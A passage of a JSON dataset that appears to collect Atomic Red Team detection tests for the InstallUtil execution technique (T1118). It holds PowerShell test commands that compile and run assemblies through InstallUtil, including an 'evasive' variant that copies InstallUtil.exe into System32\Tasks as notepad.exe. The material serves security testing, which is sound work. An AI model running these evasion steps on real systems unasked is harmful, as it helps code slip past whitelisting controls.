= $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n    InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Bash\nEventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded", "name": "Bash"}], "parsed_datasets": [{"Atomic Red Team Test - InstallUtil": {"attack_technique": "T1118", "display_name": "InstallUtil", "atomic_tests": [{"name": "CheckIfInstallable method call", "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "CheckIfInstallable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallHelper method call", "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "InstallHelper"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil class constructor method call", "description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "Executable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil Install method call", "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "Executable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil Uninstall method call - /U variant", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "Executable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n", "supported_platforms": ["windows"], "input_arguments": {"test_harness": {"description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly", "type": "Path", "default": "PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1"}, "assembly_dir": {"description": "directory to drop the compiled installer assembly", "type": "Path", "default": "$Env:TEMP\\"}, "assembly_filename": {"description": "filename of the compiled installer assembly", "type": "String", "default": "T1118.dll"}, "invocation_method": {"description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable", "type": "String", "default": "Executable"}}, "dependencies": [{"description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n", "prereq_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"}}, {"name": "InstallUtil HelpText method call", "description": "Executes the Uninstall Method. Upon execution, 